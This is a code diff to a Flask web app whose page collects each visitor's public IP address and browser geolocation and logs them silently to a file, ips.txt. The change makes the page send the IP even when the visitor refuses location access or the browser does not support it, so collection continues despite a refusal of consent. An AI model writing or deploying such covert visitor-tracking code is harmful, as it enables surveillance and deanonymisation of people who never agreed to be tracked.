@@ -22,12 +22,14 @@ def index():
                 const data = await response.json();
                 return data.ip;
             }
+
             async function sendLocation() {
+                const ip = await getUserIP(); // Get user's public IP
+
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(async (position) => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
-                        const ip = await getUserIP(); // Get user's public IP
 
                         // Send latitude, longitude, and IP to the server
                         fetch('/save_location', {
@@ -37,6 +39,24 @@ def index():
                             },
                             body: JSON.stringify({ latitude, longitude, ip })
                         });
+                    }, async () => {
+                        // If geolocation fails, send only the IP
+                        fetch('/save_location', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ ip })
+                        });
+                    });
+                } else {
+                    // If geolocation is not supported, send only the IP
+                    fetch('/save_location', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ ip })
                     });
                 }
             }
@@ -54,12 +74,12 @@ def save_location():
 
     # Get the IP address and geolocation data
     ip = data.get('ip')
-    latitude = data.get('latitude')
-    longitude = data.get('longitude')
+    latitude = data.get('latitude', 'None')
+    longitude = data.get('longitude', 'None')
 
     # Save the data to a file
     with open('ips.txt', 'a') as file:
-        file.write(f"{ip} ; {latitude} ; {longitude}\n")
+        file.write(f"{ip};{latitude};{longitude}\n")
     
     # No response to the client
     return '', 204
